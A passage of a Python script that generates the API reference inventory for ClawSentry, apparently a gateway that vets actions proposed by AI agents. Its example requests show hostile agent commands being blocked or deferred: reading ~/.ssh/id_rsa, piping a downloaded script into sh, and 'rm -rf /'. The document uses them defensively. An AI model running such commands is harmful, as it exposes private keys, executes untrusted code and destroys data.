#!/usr/bin/env python3
"""Generate and validate the public ClawSentry documentation API inventory.

The inventory is intentionally docs-owned: it records the semantic fields that
FastAPI cannot infer from generic Request/dict handlers while still checking the
route surface against source decorators.
"""
from __future__ import annotations

import argparse
from collections import Counter, defaultdict
from datetime import datetime, timezone
import json
import re
import tomllib
from pathlib import Path
from typing import Any

REPO_ROOT = Path(__file__).resolve().parents[1]
COVERAGE_PATH = REPO_ROOT / "site-docs" / "api" / "api-coverage.json"
OPENAPI_PATH = REPO_ROOT / "site-docs" / "api" / "openapi.json"
API_DOCS_DIR = REPO_ROOT / "site-docs" / "api"
VALIDITY_JSON_PATH = API_DOCS_DIR / "api-validity.json"
VALIDITY_MD_PATH = API_DOCS_DIR / "validity-report.md"
REPORT_SCHEMA_VERSION = "clawsentry-api-validity.v1"

SOURCE_FILES = {
    "gateway": REPO_ROOT / "src" / "clawsentry" / "gateway" / "server.py",
    "stack": REPO_ROOT / "src" / "clawsentry" / "gateway" / "stack.py",
    "openclaw-webhook": REPO_ROOT / "src" / "clawsentry" / "adapters" / "openclaw_webhook_receiver.py",
}


def package_version() -> str:
    pyproject = tomllib.loads((REPO_ROOT / "pyproject.toml").read_text(encoding="utf-8"))
    version = pyproject.get("project", {}).get("version")
    if not isinstance(version, str) or not version:
        raise ValueError("pyproject.toml missing [project].version")
    return version

# service, method, path, source, group, audience, status, auth, auth_note, markdown_ref, summary
ROUTES: list[dict[str, Any]] = [
    {"service":"gateway","method":"POST","path":"/ahp","source":"src/clawsentry/gateway/server.py:2413","group":"AHP 决策","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.","markdown_ref":"api/decisions.md#post-ahp","summary":"OpenClaw/AHP JSON-RPC 同步决策入口"},
    {"service":"gateway","method":"POST","path":"/ahp/a3s","source":"src/clawsentry/gateway/server.py:2441","group":"AHP 决策","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.","markdown_ref":"api/decisions.md#post-ahp-a3s","summary":"a3s-code HTTP Transport 入口"},
    {"service":"gateway","method":"POST","path":"/ahp/codex","source":"src/clawsentry/gateway/server.py:2475","group":"AHP 决策","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; production must set Bearer token.","markdown_ref":"api/decisions.md#post-ahp-codex","summary":"Codex HTTP transport 入口"},

    {"service":"gateway","method":"POST","path":"/ahp/adapter-effect-result","source":"src/clawsentry/gateway/server.py:2691","group":"AHP 决策","audience":"developer|operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth; native hook subprocesses should authenticate when token is configured.","markdown_ref":"api/decisions.md#post-ahp-adapter-effect-result","summary":"记录 adapter-observed effect outcome，不修改 canonical decision"},
    {"service":"gateway","method":"POST","path":"/ahp/scope/preview","source":"src/clawsentry/gateway/server.py:3526","group":"AHP 决策","audience":"developer|operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Scope preview is capability-honest: dry-run profiles explain what would happen but do not enforce until confirmed.","markdown_ref":"api/decisions.md#post-ahp-scope-preview","summary":"预览 deterministic SessionScopeProfile 对单个 canonical event 的 allow/defer/deny reason codes"},
    {"service":"stack","method":"POST","path":"/ahp/resolve","source":"src/clawsentry/gateway/stack.py:203","group":"AHP 决策","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"Uses Gateway auth dependency; CS_AUTH_TOKEN empty disables Bearer auth.","markdown_ref":"api/decisions.md#post-ahp-resolve","summary":"DEFER/审批结果回写入口"},
    {"service":"gateway","method":"GET","path":"/health","source":"src/clawsentry/gateway/server.py:2514","group":"运行状态","audience":"operator","public_status":"public","auth":"none","auth_note":"Gateway health endpoint is intentionally unauthenticated.","markdown_ref":"api/reporting.md#get-health","summary":"Gateway 健康检查"},
    {"service":"gateway","method":"GET","path":"/skill-trust/registry","source":"src/clawsentry/gateway/server.py:5184","group":"Skill Trust","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Reads the configured Gateway-owned Skill Trust registry.","markdown_ref":"api/reporting.md#skill-trust-lifecycle","summary":"读取 Skill Trust registry records、transition events 与 registry snapshot id"},
    {"service":"gateway","method":"GET","path":"/skill-trust/transition/recommendations","source":"src/clawsentry/gateway/server.py:5217","group":"Skill Trust","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Lists FSPR/P2 transition recommendations without mutating registry state.","markdown_ref":"api/reporting.md#skill-trust-lifecycle","summary":"读取 Skill Trust transition recommendations evidence-only queue"},
    {"service":"gateway","method":"POST","path":"/skill-trust/transition","source":"src/clawsentry/gateway/server.py:5271","group":"Skill Trust","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Mutations require expected_registry_snapshot_id and idempotency_key.","markdown_ref":"api/reporting.md#skill-trust-lifecycle","summary":"对 Skill Trust registry record 应用 auditable lifecycle transition"},
    {"service":"gateway","method":"GET","path":"/metrics","source":"src/clawsentry/gateway/server.py:2528","group":"运行状态","audience":"operator","public_status":"public","auth":"metrics-conditional","auth_note":"CS_METRICS_AUTH=true requires Bearer token; false/empty exposes metrics without auth.","markdown_ref":"api/reporting.md#get-metrics","summary":"Prometheus 指标"},
    {"service":"gateway","method":"GET","path":"/report/summary","source":"src/clawsentry/gateway/server.py:2540","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-summary","summary":"聚合统计"},
    {"service":"gateway","method":"GET","path":"/report/policy-drift","source":"src/clawsentry/gateway/server.py:4333","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-policy-drift","summary":"按 workspace/framework/session/rule family 聚合 policy drift 并提供 traceability"},
    {"service":"gateway","method":"GET","path":"/report/stream","source":"src/clawsentry/gateway/server.py:2580","group":"报表与监控","audience":"developer","public_status":"public","auth":"query-token","auth_note":"Accepts Bearer token and browser-friendly ?token= query auth; CS_AUTH_TOKEN empty disables auth.","markdown_ref":"api/reporting.md#get-report-stream","summary":"SSE 实时事件流"},
    {"service":"gateway","method":"GET","path":"/report/sessions","source":"src/clawsentry/gateway/server.py:2694","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-sessions","summary":"会话列表"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/risk","source":"src/clawsentry/gateway/server.py:2787","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-risk","summary":"会话风险时间线"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/post-action","source":"src/clawsentry/gateway/server.py:3775","group":"报表与监控","audience":"operator|developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-post-action","summary":"Post-action 安全围栏分与 session EWMA"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}","source":"src/clawsentry/gateway/server.py:3132","group":"报表与监控","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session","summary":"会话事件回放"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/page","source":"src/clawsentry/gateway/server.py:3180","group":"报表与监控","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-page","summary":"分页会话事件回放"},
    {"service":"gateway","method":"GET","path":"/report/alerts","source":"src/clawsentry/gateway/server.py:3244","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-alerts","summary":"告警列表"},
    {"service":"gateway","method":"POST","path":"/report/alerts/{alert_id}/acknowledge","source":"src/clawsentry/gateway/server.py:3327","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#post-report-alerts-acknowledge","summary":"确认告警"},
    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/enforcement","source":"src/clawsentry/gateway/server.py:3351","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-report-session-enforcement","summary":"查询会话强制状态"},
    {"service":"gateway","method":"POST","path":"/report/session/{session_id}/enforcement","source":"src/clawsentry/gateway/server.py:3358","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#post-report-session-enforcement","summary":"释放会话强制状态"},

    {"service":"gateway","method":"GET","path":"/report/session/{session_id}/quarantine","source":"src/clawsentry/gateway/server.py:3681","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Quarantine is explicit session mark-blocked state, not guaranteed host termination.","markdown_ref":"api/reporting.md#get-report-session-quarantine","summary":"查询 session quarantine / mark-blocked 状态"},
    {"service":"gateway","method":"POST","path":"/report/session/{session_id}/quarantine","source":"src/clawsentry/gateway/server.py:3691","group":"告警与处置","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. Release is explicit and audited separately from legacy enforcement cooldown.","markdown_ref":"api/reporting.md#post-report-session-quarantine","summary":"释放 session quarantine / mark-blocked 状态"},    {"service":"gateway","method":"GET","path":"/ahp/patterns","source":"src/clawsentry/gateway/server.py:3397","group":"规则与模式","audience":"developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#get-ahp-patterns","summary":"查看自进化模式"},
    {"service":"gateway","method":"POST","path":"/ahp/patterns/confirm","source":"src/clawsentry/gateway/server.py:3411","group":"规则与模式","audience":"operator","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#post-ahp-patterns-confirm","summary":"确认候选模式"},
    {"service":"openclaw-webhook","method":"POST","path":"/webhook/openclaw","source":"src/clawsentry/adapters/openclaw_webhook_receiver.py:45","group":"Webhook","audience":"developer","public_status":"public","auth":"webhook-token|webhook-hmac-optional","auth_note":"Bearer/OpenClaw token required. HMAC is config-dependent: skipped when no secret is configured; strict mode rejects missing/invalid signatures when secret exists. Timestamp, content-type, optional IP allowlist, and idempotencyKey are validated.","markdown_ref":"api/webhooks.md#post-webhook-openclaw","summary":"OpenClaw Webhook 事件接收"},
]

# L3 advisory endpoints
for item in [
    ("POST","/report/session/{session_id}/l3-advisory/snapshots","2810","创建 L3 evidence snapshot","api/reporting.md#l3-advisory-endpoints"),
    ("GET","/report/session/{session_id}/l3-advisory/snapshots","2850","列出 L3 evidence snapshots","api/reporting.md#l3-advisory-endpoints"),
    ("GET","/report/l3-advisory/snapshot/{snapshot_id}","2863","读取 L3 snapshot 与冻结记录","api/reporting.md#l3-advisory-endpoints"),
    ("GET","/report/l3-advisory/jobs","2883","列出 L3 advisory jobs","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/jobs/run-next","2914","运行最旧的 queued L3 advisory job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/jobs/drain","2950","有界运行 queued L3 advisory jobs","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/snapshot/{snapshot_id}/jobs","2883","创建 L3 advisory job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/reviews","2906","写入 L3 advisory review","api/reporting.md#l3-advisory-endpoints"),
    ("PATCH","/report/l3-advisory/review/{review_id}","2950","更新 L3 advisory review","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/snapshot/{snapshot_id}/run-local-review","3002","立即运行本地 L3 review","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/job/{job_id}/run-local","3021","运行本地 L3 job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/l3-advisory/job/{job_id}/run-worker","3040","运行 L3 worker job","api/reporting.md#l3-advisory-endpoints"),
    ("POST","/report/session/{session_id}/l3-advisory/full-review","3063","对 session 发起 operator full review","api/reporting.md#l3-advisory-endpoints"),
]:
    method,path,line,summary,ref=item
    ROUTES.append({"service":"gateway","method":method,"path":path,"source":f"src/clawsentry/gateway/server.py:{line}","group":"L3 Advisory","audience":"operator|developer","public_status":"public","auth":"bearer-disabled-when-empty-token","auth_note":"CS_AUTH_TOKEN empty disables Gateway bearer auth. L3 advisory is advisory-only and does not mutate historical canonical decisions.","markdown_ref":ref,"summary":summary})

# Enterprise conditional routes
for method,path,line,summary in [
    ("GET","/enterprise/health","2518","Enterprise enriched health"),
    ("GET","/enterprise/report/summary","2553","Enterprise enriched summary"),
    ("GET","/enterprise/report/policy-drift","4353","Enterprise policy drift report"),
    ("GET","/enterprise/report/live","2573","Enterprise live snapshot"),
    ("GET","/enterprise/report/stream","2638","Enterprise SSE stream"),
    ("GET","/enterprise/report/sessions","2739","Enterprise session list"),
    ("GET","/enterprise/report/session/{session_id}/risk","3106","Enterprise session risk"),
    ("GET","/enterprise/report/session/{session_id}","3155","Enterprise session replay"),
    ("GET","/enterprise/report/session/{session_id}/page","3211","Enterprise paged session replay"),
    ("GET","/enterprise/report/alerts","3284","Enterprise alerts"),
]:
    ROUTES.append({"service":"gateway-enterprise","method":method,"path":path,"source":f"src/clawsentry/gateway/server.py:{line}","group":"Enterprise 条件端点","audience":"operator","public_status":"enterprise","auth":"bearer-disabled-when-empty-token","auth_note":"Registered only when enterprise mode is enabled; CS_AUTH_TOKEN empty disables Gateway bearer auth.","markdown_ref":"api/reporting.md#enterprise-endpoints","summary":summary})

# Excluded/non-reference routes with explicit reason.
for service, method, path, source, reason, ref in [
    ("gateway-ui", "GET", "/ui", "src/clawsentry/gateway/server.py:3478", "Static dashboard shell, documented in Web 仪表板 not API Reference.", "dashboard/index.md"),
    ("gateway-ui", "GET", "/ui/{path:path}", "src/clawsentry/gateway/server.py:3467", "Static dashboard assets, documented in Web 仪表板 not API Reference.", "dashboard/index.md"),
    ("openclaw-webhook", "GET", "/health", "src/clawsentry/adapters/openclaw_webhook_receiver.py:41", "Service-local health duplicates Gateway /health path; documented in webhook page and excluded from shared OpenAPI to avoid path collision.", "api/webhooks.md#webhook-health"),
]:
    ROUTES.append({"service":service,"method":method,"path":path,"source":source,"group":"Excluded","audience":"operator","public_status":"excluded","auth":"none","auth_note":"Not part of shared API Reference.","markdown_ref":ref,"summary":reason,"exclusion_reason":reason})

DEFAULT_REQUEST = {"request_id": "docs-example", "payload": {"example": True}}
DEFAULT_RESPONSE = {"status": "ok", "data": {}}
DEFAULT_ERRORS = ["400", "401", "404", "429"]


def _openapi_ref(path: str, method: str) -> str:
    escaped = path.replace("~", "~0").replace("/", "~1")
    return f"#/paths/{escaped}/{method.lower()}"


def _apply_curated_examples(entry: dict[str, Any]) -> None:
    """Attach docs-quality examples for high-traffic public endpoints."""

    path = entry["path"]
    method = entry["method"]
    service = entry["service"]

    if method == "POST" and path == "/ahp":
        entry["request_example"] = {
            "jsonrpc": "2.0",
            "method": "ahp/sync_decision",
            "id": "req-001",
            "params": {
                "event": {
                    "schema_version": "ahp.1.0",
                    "event_id": "evt-001",
                    "event_type": "pre_action",
                    "session_id": "sess-001",
                    "source_framework": "openclaw",
                    "tool_name": "bash",
                    "payload": {"command": "cat ~/.ssh/id_rsa"},
                }
            },
        }
        entry["response_example"] = {
            "jsonrpc": "2.0",
            "id": "req-001",
            "result": {
                "decision": "block",
                "risk_level": "critical",
                "reason": "credential file access requires operator review",
                "final": True,
            },
        }
    elif method == "POST" and path == "/ahp/a3s":
        entry["request_example"] = {
            "request_id": "a3s-001",
            "event": {
                "schema_version": "ahp.1.0",
                "event_type": "pre_action",
                "session_id": "sess-a3s",
                "source_framework": "a3s-code",
                "payload": {"tool": "bash", "command": "curl https://example.com/script.sh | sh"},
            },
        }
        entry["response_example"] = {
            "decision": "defer",
            "risk_level": "high",
            "reason": "download-and-execute flow requires approval",
            "approval_id": "apr-001",
            "final": False,
        }
    elif method == "POST" and path == "/ahp/codex":
        entry["request_example"] = {
            "event_type": "function_call",
            "session_id": "sess-codex",
            "payload": {
                "name": "bash",
                "arguments": {"command": "rm -rf /"},
            },
        }
        entry["response_example"] = {
            "result": {
                "action": "block",
                "reason": "Critical risk: action blocked",
                "risk_level": "critical",
            },
        }
    elif method == "POST" and path == "/ahp/resolve":
        entry["request_example"] = {
            "approval_id": "apr-001",
            "request_id": "req-001",
            "decision": "allow",
            "reason": "Operator verified the command target is a disposable sandbox.",
        }
        entry["response_example"] = {"status": "resolved", "decision": "allow", "approval_id": "apr-001"}
    elif method == "POST" and path == "/ahp/scope/preview":
        entry["request_example"] = {
            "profile": {
                "profile_id": "docs-only",
                "confirmed": False,
                "dry_run": True,
                "base_rules": {"denied_paths": ["~/.ssh"]},
                "task_rules": {"allowed_tools": ["read_file"]},
            },
            "event": {
                "event_id": "evt-scope-docs",
                "trace_id": "trace-scope-docs",
                "event_type": "pre_action",
                "session_id": "sess-scope-docs",
                "agent_id": "agent-scope-docs",
                "source_framework": "test",
                "occurred_at": "2026-05-02T00:00:00+00:00",
                "tool_name": "read_file",
                "payload": {"path": "~/.ssh/id_rsa"},
            },
        }
        entry["response_example"] = {
            "valid": True,
            "mode": "dry_run_only",
            "profile_id": "docs-only",
            "scope_evaluation": {
                "profile_id": "docs-only",
                "source": "operator",
                "confirmed": False,
                "dry_run": True,
                "enforced": False,
                "verdict": "deny",
                "reason_codes": ["scope_deny:path ~/.ssh"],
            },
            "protection_statement": (
                "Protected today: scope preview validates rules and explains the decision "
                "that would apply. Not protected today: dry-run scope profiles do not "
                "block or defer actions until explicitly confirmed."
            ),
        }
    elif method == "GET" and path == "/health":
        entry["response_example"] = {"status": "healthy", "component": service}
        entry["errors"] = ["500"]
    elif method == "GET" and path == "/metrics":
        entry["response_example"] = "# HELP clawsentry_decisions_total Total decisions\nclawsentry_decisions_total{decision=\"block\"} 3\n"
        entry["errors"] = ["401", "500"]
    elif method == "GET" and path == "/report/summary":
        entry["response_example"] = {
            "total_records": 1250,
            "by_source_framework": {"a3s-code": 800, "openclaw": 450},
            "by_event_type": {"pre_action": 900, "post_action": 300, "session": 50},
            "by_decision": {"allow": 1000, "block": 150, "defer": 80, "modify": 20},
            "by_risk_level": {"low": 800, "medium": 300, "high": 120, "critical": 30},
            "by_actual_tier": {"L1": 1200, "L2": 50},
            "by_caller_adapter": {"a3s-adapter.v1": 800, "openclaw-adapter.v1": 450},
            "invalid_event": {"count_1m": 0, "count_5m": 2, "count_15m": 5, "rate_5m": 0.004, "rate_15m": 0.002, "alerts": []},
            "high_risk_trend": {
                "windows": {
                    "5m": {"count": 3, "total": 50, "ratio": 0.06},
                    "15m": {"count": 8, "total": 150, "ratio": 0.053},
                    "60m": {"count": 20, "total": 500, "ratio": 0.04},
                },
                "direction_5m": "up",
                "series_5m": [
                    {
                        "bucket_start": "2026-03-23T09:00:00+00:00",
                        "bucket_end": "2026-03-23T09:05:00+00:00",
                        "total_count": 40,
                        "high_or_critical_count": 2,
                        "ratio": 0.05,
                    }
                ],
            },
            "system_security_posture": {
                "score_0_100": 72.5,
                "level": "elevated",
                "drivers": [{"key": "high_sessions", "label": "High-risk sessions", "value": 3}],
                "window_seconds": 3600,
                "generated_at": "2026-04-25T12:00:05Z",
                "decision_affecting": False,
            },
            "decision_path_io": {
                "record_path": {"calls": 25},
                "reporting": {"report_summary": {"calls": 1}},
            },
            "decision_path_io_pressure": {
                "level": "healthy",
                "max_seconds": 0.01,
                "decision_affecting": False,
            },
            "generated_at": "2026-03-23T10:30:00+00:00",
            "window_seconds": None,
        }
    elif method == "GET" and path in {"/report/policy-drift", "/enterprise/report/policy-drift"}:
        entry["response_example"] = {
            "generated_at": "2026-05-15T00:00:00+08:00",
            "window_seconds": 3600,
            "comparison_window_seconds": 3600,
            "grouping_dimensions": [
                "workspace_root",
                "source_framework",
                "session_id",
                "rule_family",
            ],
            "total_cells": 1,
            "cells": [
                {
                    "cell_id": "/workspace/payments|codex|sess-001|skill_trust",
                    "workspace_root": "/workspace/payments",
                    "source_framework": "codex",
                    "session_id": "sess-001",
                    "rule_family": "skill_trust",
                    "current": {
                        "record_count": 1,
                        "decision_distribution": {"block": 1},
                        "risk_distribution": {"high": 1},
                        "rule_hits": {"ambiguous_skill_alias": 1},
                        "block_rate": 1.0,
                        "high_or_critical_rate": 1.0,
                    },
                    "previous": {
                        "record_count": 1,
                        "decision_distribution": {"allow": 1},
                        "risk_distribution": {"low": 1},
                        "rule_hits": {"unknown_skill_identity": 1},
                        "block_rate": 0.0,
                        "high_or_critical_rate": 0.0,
                    },
                    "delta": {
                        "record_count": 0,
                        "block_rate": 1.0,
                        "high_or_critical_rate": 1.0,
                    },
                    "traceability": {
                        "request_ids": ["req-current"],
                        "record_ids": ["42"],
                        "event_ids": ["evt-current"],
                        "registry_states": ["unlisted"],
                        "rule_evidence": ["ambiguous_skill_alias"],
                        "fallback_paths": ["gateway_policy"],
                        "adapter_effect_result_ids": ["effect-current"],
                    },
                }
            ],
            "budget": {"exhausted": False},
            "llm_usage_snapshot": {},
            "decision_path_io": {"reporting": {"report_policy_drift": {"calls": 1}}},
        }
    elif method == "GET" and path == "/enterprise/report/summary":
        entry["response_example"] = {
            "total_records": 1250,
            "by_source_framework": {"a3s-code": 800, "codex": 450},
            "by_risk_level": {"low": 800, "medium": 300, "high": 120, "critical": 30},
            "by_actual_tier": {"L1": 1100, "L2": 120, "L3": 30},
            "trinityguard": {
                "total_records": 1250,
                "mapped_records": 180,
                "unmapped_records": 1070,
                "by_tier": {"RT1": 120, "RT2": 40, "RT3": 20},
                "by_subtype": {
                    "prompt_injection": 45,
                    "sensitive_info_disclosure": 35,
                    "unauthorized_code_execution": 25,
                    "insecure_output_handling": 20,
                    "cascading_failure": 12,
                },
            },
            "enterprise": {
                "live_risk_overview": {
                    "active_sessions": 18,
                    "mapped_active_sessions": 6,
                    "by_trinityguard_tier": {"RT1": 4, "RT2": 1, "RT3": 1},
                    "by_trinityguard_subtype": {
                        "prompt_injection": 2,
                        "sensitive_info_disclosure": 1,
                        "tool_misuse": 1,
                        "insecure_output_handling": 1,
                        "cascading_failure": 1,
                    },
                    "system_security_posture": {
                        "score_0_100": 72.5,
                        "level": "elevated",
                        "decision_affecting": False,
                    },
                },
            },
            "generated_at": "2026-04-25T12:00:05Z",
            "window_seconds": 3600,
        }
    elif method == "GET" and path == "/enterprise/report/live":
        entry["response_example"] = {
            "generated_at": "2026-04-25T12:00:05Z",
            "active_sessions": 18,
            "high_risk_sessions": 3,
            "mapped_active_sessions": 6,
            "by_risk_level": {"low": 10, "medium": 5, "high": 2, "critical": 1},
            "by_trinityguard_tier": {"RT1": 4, "RT2": 1, "RT3": 1},
            "by_trinityguard_subtype": {
                "prompt_injection": 2,
                "sensitive_info_disclosure": 1,
                "tool_misuse": 1,
                "insecure_output_handling": 1,
                "cascading_failure": 1,
            },
            "top_trinityguard_tiers": [
                {"tier": "RT1", "count": 4},
                {"tier": "RT2", "count": 1},
                {"tier": "RT3", "count": 1},
            ],
            "top_trinityguard_subtypes": [
                {"subtype": "prompt_injection", "count": 2},
                {"subtype": "sensitive_info_disclosure", "count": 1},
            ],
            "system_security_posture": {
                "score_0_100": 72.5,
                "level": "elevated",
                "drivers": [{"key": "high_sessions", "label": "High-risk sessions", "value": 2}],
                "window_seconds": 3600,
                "decision_affecting": False,
            },
            "cache_ttl_ms": 1000,
            "stale": False,
            "degraded": False,
            "degraded_reason": None,
        }
    elif method == "GET" and path == "/report/sessions":
        entry["response_example"] = {
            "sessions": [
                {
                    "session_id": "session-001",
                    "agent_id": "agent-001",
                    "source_framework": "a3s-code",
                    "caller_adapter": "a3s-adapter.v1",
                    "workspace_root": "/workspace/repo-alpha",
                    "transcript_path": "/workspace/repo-alpha/.a3s/session-001.jsonl",
                    "current_risk_level": "high",
                    "cumulative_score": 5,
                    "latest_composite_score": 2.4,
                    "session_risk_sum": 6.7,
                    "session_risk_ewma": 1.9,
                    "latest_post_action_score": 1.0,
                    "post_action_score_ewma": 0.72,
                    "risk_points_sum": 5,
                    "risk_velocity": "up",
                    "window_risk_summary": {
                        "window_seconds": None,
                        "generated_at": "2026-03-23T10:31:00+00:00",
                        "event_count": 25,
                        "high_or_critical_count": 3,
                        "latest_composite_score": 2.4,
                        "session_risk_sum": 6.7,
                        "session_risk_ewma": 1.9,
                        "risk_points_sum": 5,
                        "risk_velocity": "up",
                        "score_range": [0.0, 3.0],
                        "score_semantics": {
                            "zero_with_no_events": "no_data_not_confirmed_low_risk",
                            "decision_affecting": False,
                        },
                        "decision_affecting": False,
                    },
                    "post_action_score_summary": {
                        "window_seconds": None,
                        "generated_at": "2026-03-23T10:31:00+00:00",
                        "event_count": 3,
                        "latest_post_action_score": 1.0,
                        "post_action_score_sum": 2.4,
                        "post_action_score_avg": 0.8,
                        "post_action_score_ewma": 0.72,
                        "score_range": [0.0, 3.0],
                        "score_semantics": {
                            "zero_with_no_events": "no_post_action_data_not_confirmed_low_risk",
                            "decision_affecting": False,
                        },
                        "decision_affecting": False,
                    },
                    "score_range": [0.0, 3.0],
                    "score_semantics": {
                        "zero_with_no_events": "no_data_not_confirmed_low_risk",
                        "decision_affecting": False,
                    },
                    "latest_decision": "defer",
                    "event_count": 25,
                    "high_or_critical_count": 3,
                    "decision_distribution": {"allow": 20, "block": 3, "defer": 2},
                    "first_event_at": "2026-03-23T10:00:00+00:00",
                    "last_event_at": "2026-03-23T10:30:00+00:00",
                    "d4_accumulation": 4,
                    "l3_state": "completed",
                    "l3_reason_code": "suspicious_sequence_matched",
                    "evidence_summary": {
                        "reasoning_turns": 3,
                        "tools_observed": ["read_trajectory", "read_file"],
                        "key_findings": ["Read secret-like file before outbound curl"],
                    },
                }
            ],
            "total_active": 1,
            "decision_path_io": {
                "record_path": {"calls": 25},
                "reporting": {"report_sessions": {"calls": 1}},
            },
            "generated_at": "2026-03-23T10:31:00+00:00",
            "window_seconds": None,
        }
    elif method == "GET" and path == "/enterprise/report/sessions":
        entry["response_example"] = {
            "sessions": [
                {
                    "session_id": "session-001",
                    "source_framework": "codex",
                    "workspace_root": "/workspace/repo-alpha",
                    "current_risk_level": "high",
                    "session_risk_ewma": 1.9,
                    "trinityguard_classification": {
                        "mapped": True,
                        "tier": "RT1",
                        "tier_label": "Atomic Risks",
                        "subtype": "sensitive_info_disclosure",
                        "label": "Sensitive Info Disclosure",
                        "confidence": "high",
                    },
                }
            ],
            "total_active": 1,
            "enterprise": {
                "live_risk_overview": {
                    "active_sessions": 1,
                    "mapped_active_sessions": 1,
                    "by_trinityguard_tier": {"RT1": 1},
                    "by_trinityguard_subtype": {"sensitive_info_disclosure": 1},
                }
            },
            "generated_at": "2026-04-25T12:00:05Z",
            "window_seconds": None,
        }
    elif method == "GET" and path == "/report/stream":
        entry["response_example"] = "event: decision\ndata: {\"session_id\":\"sess-001\",\"decision\":\"block\",\"risk_level\":\"high\"}\n\n"
        entry["errors"] = ["401", "429", "500"]
    elif method == "GET" and path == "/enterprise/report/stream":
        entry["response_example"] = (
            "event: decision\n"
            "data: {\"session_id\":\"sess-001\",\"risk_level\":\"high\","
            "\"trinityguard_classification\":{\"tier\":\"RT1\",\"subtype\":\"tool_misuse\"},"
            "\"live_risk_overview\":{\"by_trinityguard_tier\":{\"RT1\":1}}}\n\n"
        )
        entry["errors"] = ["401", "429", "500"]
    elif method == "GET" and path == "/report/session/{session_id}":
        entry["response_example"] = {
            "session_id": "sess-001",
            "records": [
                {
                    "event": {"event_type": "pre_action", "tool_name": "bash"},
                    "decision": {"decision": "block", "risk_level": "high"},
                }
            ],
        }
    elif method == "GET" and path == "/enterprise/report/session/{session_id}":
        entry["response_example"] = {
            "session_id": "sess-001",
            "record_count": 1,
            "records": [
                {
                    "event": {"event_id": "evt-001", "event_type": "pre_action", "tool_name": "bash"},
                    "decision": {"decision": "block", "risk_level": "high"},
                    "trinityguard_classification": {
                        "mapped": True,
                        "tier": "RT1",
                        "subtype": "unauthorized_code_execution",
                        "label": "Unauthorized Code Execution",
                    },
                }
            ],
            "trinityguard_summary": {
                "mapped_records": 1,
                "unmapped_records": 0,
                "by_tier": {"RT1": 1},
                "by_subtype": {"unauthorized_code_execution": 1},
            },
        }
    elif method == "GET" and path == "/report/session/{session_id}/page":
